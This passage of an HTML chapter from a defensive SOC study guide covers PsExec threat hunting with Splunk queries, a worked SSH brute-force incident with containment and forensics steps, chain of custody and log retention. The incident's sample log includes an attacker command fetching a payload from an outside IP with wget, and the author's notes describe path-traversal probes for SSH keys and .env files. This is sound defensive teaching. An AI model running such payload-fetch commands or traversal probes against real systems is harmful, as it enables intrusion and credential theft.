+<pre><code>1. Hypothesis  -&gt; &quot;An attacker may be performing lateral movement via PsExec (T1021.002 / T1570)&quot;
+2. Data        -&gt; Identify the data sources needed: Event 7045 (service install), 4624 LogonType 3,
+                  network SMB 445, process create (4688) named psexesvc.
+3. Hunt/Query  -&gt; Run queries to find signs.
+4. Triage      -&gt; What was found? Analyze it.
+5. Outcome     -&gt; If found -&gt; incident. If not -&gt; create a new detection to automate the hunt.
+</code></pre>
+<h3 id="ch10-1092-a-concrete-hunt-example-lateral-movement-via-psexec">10.9.2. A concrete hunt example — Lateral Movement via PsExec</h3>
+<p><strong>Hypothesis:</strong> "An internal host is using PsExec to run commands remotely on another host."</p>
+<p><strong>Distinctive byte/event signs of PsExec:</strong>
+- PsExec creates a <strong>service named <code>PSEXESVC</code></strong> on the target machine → <strong>Event 7045</strong> with <code>Service Name = PSEXESVC</code> and the binary path <code>%SystemRoot%\PSEXESVC.exe</code>.
+- A <strong>Network (LogonType 3)</strong> logon from the source host (Event 4624) immediately beforehand.
+- An <strong>SMB connection on port 445</strong> from source to target; files written via the <strong>ADMIN$ share</strong>.
+- A named pipe <code>\PSEXESVC</code> is created.</p>
+<p><strong>Splunk query:</strong></p>
+<pre><code class="language-spl">index=wineventlog EventCode=7045 Service_Name=&quot;PSEXESVC&quot;
+| stats count by Computer, _time
+| sort _time
+</code></pre>
+<p>Correlate with network logons:</p>
+<pre><code class="language-spl">index=wineventlog EventCode=4624 Logon_Type=3
+| join Computer
+  [ search index=wineventlog EventCode=7045 Service_Name=&quot;PSEXESVC&quot; ]
+| table _time, Computer, IpAddress, TargetUserName
+</code></pre>
+<p><strong>Subtle point:</strong> the attacker can rename the service (PsExec supports <code>-r</code>); an advanced hunt looks for the <strong>behavioral pattern</strong> (a newly created service + a binary in an unusual path + run once then removed) rather than just the name <code>PSEXESVC</code>.</p>
+<p><strong>MITRE mapping:</strong> T1021.002 (SMB/Windows Admin Shares), T1570 (Lateral Tool Transfer), T1569.002 (Service Execution).</p>
+<h3 id="ch10-1093-the-pyramid-of-pain-model">10.9.3. The "Pyramid of Pain" model</h3>
+<p>When creating IOCs/detections, prioritize the indicators that are hardest to evade:</p>
+<pre><code>            ▲ Hard for the attacker to change (high value)
+   TTPs               &lt;- Hardest, the best to hunt
+   Tools
+   Network/Host Artifacts
+   Domain Names
+   IP Addresses
+   Hash Values        &lt;- Easiest to change (low value)
+            ▼
+</code></pre>
+<p><strong>Why:</strong> a hash changes just by adding 1 byte; but behavior (TTP) reflects how the attacker operates, which is very costly to change. Hunting by TTP/behavior is more durable than hunting by static IOCs.</p>
+<hr />
+<h2 id="ch10-1010-worked-example-analysis-from-start-to-finish">10.10. Worked example — analysis from start to finish</h2>
+<p>Scenario: <strong>many failed logins followed by one successful login</strong> on a Linux server with SSH exposed to the Internet (<code>auth-srv-01</code>, internal IP <code>10.0.0.5</code>).</p>
+<h3 id="ch10-step-0-raw-log-varlogauthlog">Step 0 — Raw log (<code>/var/log/auth.log</code>)</h3>
+<pre><code>Jun 19 08:20:31 auth-srv-01 sshd[4801]: Failed password for invalid user admin from 203.0.113.45 port 50991 ssh2
+Jun 19 08:20:33 auth-srv-01 sshd[4805]: Failed password for invalid user root from 203.0.113.45 port 50995 ssh2
+Jun 19 08:20:35 auth-srv-01 sshd[4809]: Failed password for invalid user oracle from 203.0.113.45 port 51001 ssh2
+... (hundreds of similar lines, ~3 per second) ...
+Jun 19 08:24:58 auth-srv-01 sshd[5102]: Failed password for deploy from 203.0.113.45 port 52210 ssh2
+Jun 19 08:25:01 auth-srv-01 sshd[5108]: Accepted password for deploy from 203.0.113.45 port 52240 ssh2
+Jun 19 08:25:01 auth-srv-01 sshd[5108]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Jun 19 08:25:44 auth-srv-01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.45/x.sh
+</code></pre>
+<h3 id="ch10-step-1-detection">Step 1 — Detection</h3>
+<p>A Sigma/Suricata threshold (section 10.8) fires an alert "SSH brute force from 203.0.113.45". Tier 1 receives the alert.</p>
+<h3 id="ch10-step-2-triage-tier-1">Step 2 — Triage (Tier 1)</h3>
+<ul>
+<li><strong>Validation:</strong> read the raw log, confirm ~400 failures within ~4.5 minutes from a single src → TP, not an FP/known scanner.</li>
+<li><strong>Severity pivot point:</strong> the line <code>Accepted password for deploy</code> → <strong>a success has occurred</strong>. Raise severity from "brute-force attempt" to "credential compromise". Escalate to Tier 2 IMMEDIATELY.</li>
+</ul>
+<p>Counting queries:</p>
+<pre><code class="language-bash">grep &quot;Failed password&quot; /var/log/auth.log | grep &quot;203.0.113.45&quot; | wc -l
+# 412
+grep &quot;Accepted password&quot; /var/log/auth.log | grep &quot;203.0.113.45&quot;
+# Jun 19 08:25:01 ... Accepted password for deploy from 203.0.113.45 ...
+</code></pre>
+<h3 id="ch10-step-3-analysis-tier-2">Step 3 — Analysis (Tier 2)</h3>
+<ul>
+<li><strong>Timeline:</strong> 08:20:31 spray begins → 08:25:01 success for user <code>deploy</code> → 08:25:44 runs <code>sudo wget http://203.0.113.45/x.sh</code> (downloading a payload, suspected second-stage).</li>
+<li><strong>Scope:</strong> user <code>deploy</code> ran sudo → may have become root. Must treat this as <strong>the entire host being compromised</strong>.</li>
+<li><strong>Extracted IOCs:</strong> IP <code>203.0.113.45</code>, target user <code>deploy</code>, payload URL <code>http://203.0.113.45/x.sh</code>.</li>
+</ul>
+<h3 id="ch10-step-4-containment-short-term">Step 4 — Containment (short-term)</h3>
+<pre><code class="language-bash"># Isolate the host from the network but KEEP it running (preserve RAM)
+sudo iptables -I INPUT 1 -s 203.0.113.45 -j DROP
+sudo iptables -I OUTPUT 1 -d 203.0.113.45 -j DROP
+# Or isolate fully via EDR network-isolate. Collect before cutting off entirely.
+</code></pre>
+<p>Collect volatile data before eradication:</p>
+<pre><code class="language-bash">ss -tnp        # open connections (look for a reverse shell to 203.0.113.45)
+ps auxf        # process tree
+sudo lsof -p &lt;suspect_pid&gt;
+crontab -l; ls -la /etc/cron.*   # persistence
+last; w        # login sessions
+</code></pre>
+<h3 id="ch10-step-5-forensics-chain-of-custody">Step 5 — Forensics &amp; Chain of Custody</h3>
+<ul>
+<li>Capture memory (e.g. <code>LiME</code>/<code>avml</code>) and a disk image before making changes.</li>
+<li>Compute the evidence hash and record the chain of custody (section 10.11).</li>
+</ul>
+<h3 id="ch10-step-6-eradication">Step 6 — Eradication</h3>
+<ul>
+<li>Reset the <code>deploy</code> password + all accounts; disable SSH password auth (switch to key-only).</li>
+<li>Find &amp; remove the <code>x.sh</code> payload, backdoors, unusual cron entries, and unknown SSH keys in <code>~/.ssh/authorized_keys</code>.</li>
+<li>Because root privilege is suspected → <strong>rebuild the host from a clean image</strong> rather than cleaning in place.</li>
+</ul>
+<h3 id="ch10-step-7-recovery">Step 7 — Recovery</h3>
+<ul>
+<li>Restore services on the newly built host; place SSH behind a bastion/VPN; enable fail2ban + MFA; apply enhanced monitoring of 203.0.113.45 and of <code>deploy</code>'s behavior.</li>
+</ul>
+<h3 id="ch10-step-8-lessons-learned">Step 8 — Lessons Learned</h3>
+<ul>
+<li>Why was SSH with password auth exposed directly to the Internet? Why did <code>deploy</code> have a weak password and no MFA? → Enforce a key-only policy, MFA, rate-limiting, and take SSH off the Internet. Add a "success immediately after a failure sequence" detection to shorten MTTD.</li>
+</ul>
+<hr />
+<h2 id="ch10-1011-chain-of-custody-basic-forensics">10.11. Chain of Custody &amp; basic forensics</h2>
+<h3 id="ch10-10111-chain-of-custody">10.11.1. Chain of Custody</h3>
+<p><strong>What it is:</strong> a record documenting who held the evidence, when, and what was done with it — so the evidence has legal value (proving it was not tampered with).</p>
+<p>A chain-of-custody form template — each required field:</p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Meaning</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Evidence ID</td>
+<td>Unique identifier</td>
+<td>EV-2026-0619-001</td>
+</tr>
+<tr>
+<td>Description</td>
+<td>Description of the evidence</td>
+<td>Disk image of auth-srv-01, 500GB</td>
+</tr>
+<tr>
+<td>Collected by</td>
+<td>Person who collected it</td>
+<td>Analyst A</td>
+</tr>
+<tr>
+<td>Date/Time</td>
+<td>Time (with timezone)</td>
+<td>2026-06-19 09:10 UTC</td>
+</tr>
+<tr>
+<td>Hash (acquisition)</td>
+<td>Hash at collection time</td>
+<td>SHA-256: a1b2...</td>
+</tr>
+<tr>
+<td>Method/Tool</td>
+<td>Tool + version</td>
+<td>dd / FTK Imager 4.7</td>
+</tr>
+<tr>
+<td>Custody log</td>
+<td>The handoff chain (from → to, time, reason)</td>
+<td>A → B, 10:00, for analysis</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch10-10112-the-order-of-volatility-principle-rfc-3227">10.11.2. The Order of Volatility principle (RFC 3227)</h3>
+<p>Collect in order from most easily lost to most durable:</p>
+<pre><code>1. CPU registers, cache
+2. RAM (processes, network state, code not written to disk)
+3. Network state (connections, ARP, routing table)
+4. Running processes
+5. Disk (file system)
+6. Remote logging / monitoring data
+7. Physical configuration, topology
+8. External storage media (backups, ...)
+</code></pre>
+<p><strong>Why:</strong> RAM is lost when power is removed; powering off immediately = losing the reverse shell, code running only in memory, and decryption keys. This is why, in the ransomware/brute-force playbooks, we <strong>do not power off</strong> the machine, only isolate the network.</p>
+<h3 id="ch10-10113-collection-integrity-verification">10.11.3. Collection &amp; integrity verification</h3>
+<pre><code class="language-bash"># Create a read-only disk image and compute the hash at the same time
+sudo dd if=/dev/sda bs=4M conv=noerror,sync status=progress | tee image.dd | sha256sum
+# Save the hash
+sha256sum image.dd &gt; image.dd.sha256
+# When verifying again later:
+sha256sum -c image.dd.sha256
+# image.dd: OK
+</code></pre>
+<p><strong>Why use a hash:</strong> SHA-256 (a 256-bit/32-byte digest) lets you prove the image has not changed by a single bit since collection. One changed bit → the hash changes completely (avalanche effect). Use a hardware <strong>write-blocker</strong> to ensure evidence is not overwritten while reading it.</p>
+<p><strong>Security/legal note:</strong> a break in the chain of custody (a time gap, no hash, using an untrusted tool) renders evidence worthless in court. Forensics must be performed on a <strong>copy</strong> (image), never on the original drive.</p>
+<hr />
+<h2 id="ch10-1012-log-retention-storage-policy-and-reasoning">10.12. Log Retention — storage policy and reasoning</h2>
+<h3 id="ch10-10121-why-retain-logs-for-a-long-time">10.12.1. Why retain logs for a long time</h3>
+<ul>
+<li><strong>Dwell time:</strong> the time an attacker hides in a network before being detected is typically measured in weeks to months (per industry reports such as Mandiant M-Trends — the specific figure varies by year, [needs verification against the latest report]). If you keep logs for only 30 days but the dwell time is 90 days → you have no logs from the moment of initial intrusion to investigate.</li>
+<li><strong>Compliance:</strong> many frameworks require a minimum retention period. Common examples (verify against the current version):</li>
+<li>PCI DSS: a minimum of 1 year of logs, with ≥ 3 months immediately available — [verify against the current PCI DSS version].</li>
+<li>Many financial/healthcare regulations require several years.</li>
+</ul>
+<h3 id="ch10-10122-tiered-storage-model-hotwarmcold">10.12.2. Tiered storage model (hot/warm/cold)</h3>
+<table>
+<thead>
+<tr>
+<th>Tier</th>
+<th>Duration</th>
+<th>Characteristics</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Hot</td>
+<td>0–30 days</td>
+<td>Fully indexed, fast queries, expensive</td>
+<td>Detection &amp; current investigations</td>
+</tr>
+<tr>
+<td>Warm</td>
+<td>30–90 days</td>
+<td>Partially indexed, slower</td>
+<td>Investigation of recent incidents</td>
+</tr>
+<tr>
+<td>Cold/Archive</td>
+<td>90 days–several years</td>
+<td>Compressed, cheap storage (object storage), slow recovery</td>
+<td>Compliance, old investigations, legal</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Why tiering:</strong> a hot index consumes CPU/RAM/disk; keeping everything hot is very expensive. Tiering balances cost against accessibility.</p>
+<h3 id="ch10-10123-protecting-log-integrity">10.12.3. Protecting log integrity</h3>
+<ul>
+<li><strong>Write-once / WORM</strong> or append-only to prevent log modification/deletion (attackers always try to erase logs — Event 1102 is a sign of this).</li>
+<li><strong>Forward logs in real time</strong> off the host (to the SIEM) so that if the host is compromised the logs still exist elsewhere.</li>
+<li><strong>Time sync (NTP)</strong> across the entire infrastructure — without a unified time you cannot build a correlated multi-source timeline.</li>
+</ul>
+<p><strong>Security note:</strong> retention is not only about "how long to keep" but also "who can read it" — logs contain sensitive data (usernames, IPs, sometimes leaked credentials). Access control over the log store and at-rest encryption are mandatory.</p>
+<hr />
+<h2 id="ch10-1013-summary-tying-the-pieces-together">10.13. Summary — tying the pieces together</h2>
+<p>SOC operations form a closed loop:</p>
+<ul>
+<li><strong>Operational loop:</strong> preparation (logging, playbooks, tools) → detection (rules over normalized logs) → triage (Tier 1) → investigation (Tier 2) → response (containment/eradication/recovery, preserving evidence) → lessons → detection improvement.</li>
+<li><strong>Feedback from hunting:</strong> threat hunting (Tier 3) feeds new findings back to enrich automated detection.</li>
+<li><strong>The common foundation of every step:</strong></li>
+<li><strong>Reading logs correctly down to each field</strong> — syslog PRI, Event ID/LogonType/Status, CEF extension.</li>
+<li><strong>Measuring correctly</strong> — clearly defined MTTD/MTTR.</li>
+<li><strong>Handling evidence to standard</strong> — order of volatility, chain of custody, integrity hashing.</li>
+</ul>
+<p>The takeaway that ties it together:</p>
+<ul>
+<li><strong>Mastering the byte/field/step details</strong> is the prerequisite for steady, reliable operations.</li>
+<li>Skipping them leaves blind spots — and an attacker exploits exactly those blind spots in your operations.</li>
+</ul>
+<hr />
+<h2 id="ch10-my-notes">My notes</h2>
+<blockquote>
+<p><em>Personal notes: points I previously misunderstood, areas I'm still exploring, or lessons from hands-on practice — updated over time.</em></p>
+</blockquote>
+<ul>
+<li><strong>Investigate the real alert; don't trust the SIEM summary.</strong> On a system I operate (a Wazuh + OpenSearch stack) a public VPS IP once fired a few hundred requests over more than two hours probing for path traversal — <code>%252e%252e</code> (double-encoding), <code>....//</code>, targeting <code>.ssh/id_rsa</code>, <code>.env</code>, <code>.mysql_history</code>, and even rotating its user-agent and faking a Bing referer to blend in. The alert looked scary at first, but once I opened the raw events (aggregating by <code>data.url</code> and <code>rule.id</code>, building a date_histogram, reading <code>full_log</code> to recover the original log line because the box's access.log had already rotated) it was all <code>301/400/404</code> — no "attack returned 200" event anywhere. Conclusion: heavily scanned but <strong>not breached</strong>. The lesson matches section 10.4: real severity lives in the <em>outcome</em> (any unexpected 2xx?), not in the <em>volume</em> of requests.</li>
+<li><strong>Blocking IPs is whack-a-mole.</strong> After that incident I tried blocking the IP, and the next day dozens of other IPs/subnets were scanning the whole fleet. Since then I lean toward <em>behavior</em>-based hardening (rate-limiting, restricting access by source, blocking sensitive filenames at the proxy layer) instead of chasing individual IPs.</li>
+<li><strong>SOAR is for cutting noise, not replacing people.</strong> I'm building a flow that wires SIEM → SOAR: extract the public IP from an alert, enrich it against a couple of threat-intel sources (an AbuseIPDB-style confidence score plus a VirusTotal-style count of flagging engines) before notifying the ops channel. The biggest value isn't "auto-block" — it's <strong>distinguishing a source with an attack history from legitimate access that got logged by mistake</strong>, which visibly reduces the alerts a human has to touch. In the spirit of section 10.8.6, I still keep destructive actions (block/purge) human-in-the-loop and only automate the enrich/labeling part.</li>
+<li><strong>Still exploring:</strong> wiring an auto-block threshold (fail2ban ↔ SIEM style) that won't shoot me in the foot when a legitimate IP accidentally crosses the threshold.</li>
+</ul>
+</section>
+      <nav class="pager"><a class="pg prev" href="ch09.html"><span>← Previous</span><b>09 · Observability &amp; Monitoring</b></a><a class="pg next" href="ch11.html"><span>Next →</span><b>11 · Network Defense (IDS/WAF/VPN)</b></a></nav>
+    </main>
+    <footer class="site-foot">
+      <p>Written & shared by <span class="name">Fee</span> · free for learning purposes.
+      &nbsp;·&nbsp; <a href="https://github.com/fee-191" target="_blank" rel="noopener">GitHub</a>
+      &nbsp;·&nbsp; <a href="https://linkedin.com/in/leduongphi191" target="_blank" rel="noopener">LinkedIn</a></p>
+      <p>Educational content for defensive purposes. Practice legally, only on systems you are authorized to test.</p>
+    </footer>
+  </div>
+</div>
+<script>
+const root=document.documentElement;
+const THEMES=['light','dark','wibu'];
+const ICON={light:'☀️',dark:'🌙',wibu:'🌸'};
+function curTheme(){return root.getAttribute('data-theme')||'light';}
+function syncTheme(){const c=curTheme();document.querySelectorAll('.themeBtn').forEach(b=>b.textContent=ICON[c]||'☀️');}
+function setTheme(t){if(t==='light')root.removeAttribute('data-theme');else root.setAttribute('data-theme',t);localStorage.setItem('kb-theme',t);syncTheme();}
+syncTheme();
+document.querySelectorAll('.themeBtn').forEach(b=>b.addEventListener('click',()=>{
+  const i=THEMES.indexOf(curTheme());setTheme(THEMES[(i+1)%THEMES.length]);
+}));
+const navChapters=[...document.querySelectorAll('.nav-chapter')];
+document.querySelectorAll('.nav-sub, .nav-ch-title').forEach(a=>a.addEventListener('click',()=>{if(window.innerWidth<=980)document.querySelector('.sidebar').classList.remove('show');}));
+// Đánh dấu mục con đang đọc trong chương hiện tại
+const cur=document.querySelector('.nav-chapter.active');
+if(cur){
+  const heads=[...document.querySelectorAll('.chapter h2[id]')];
+  const links=new Map([...cur.querySelectorAll('.nav-sub')].map(a=>[a.getAttribute('href').slice(1),a]));
+  const obs=new IntersectionObserver((es)=>{es.forEach(e=>{if(e.isIntersecting){
+    links.forEach(a=>a.classList.remove('here'));
+    const a=links.get(e.target.id); if(a){a.classList.add('here');a.scrollIntoView({block:'nearest'});}
+  }});},{rootMargin:'-10% 0px -80% 0px',threshold:0});
+  heads.forEach(h=>obs.observe(h));
+}
+const box=document.getElementById('q');
+if(box)box.addEventListener('input',()=>{const q=box.value.trim().toLowerCase();
+  navChapters.forEach(c=>{const title=c.querySelector('.nav-ch-title').innerText.toLowerCase();
+    const subs=[...c.querySelectorAll('.nav-sub')];let any=title.includes(q);
+    subs.forEach(s=>{const m=s.innerText.toLowerCase().includes(q);s.style.display=(!q||m)?'block':'none';if(m)any=true;});
+    c.style.display=(!q||any)?'block':'none';});
+});
+const mb=document.getElementById('menu');if(mb)mb.addEventListener('click',()=>document.querySelector('.sidebar').classList.toggle('show'));
+// ←/→ chuyển chương
+document.addEventListener('keydown',e=>{
+  if(e.target.tagName==='INPUT'||e.metaKey||e.ctrlKey||e.altKey)return;
+  const p=document.querySelector('link[rel=prev]'),n=document.querySelector('link[rel=next]');
+  if(e.key==='ArrowLeft'&&p)location.href=p.href;
+  if(e.key==='ArrowRight'&&n)location.href=n.href;
+});
+</script>
+</body>
+</html>
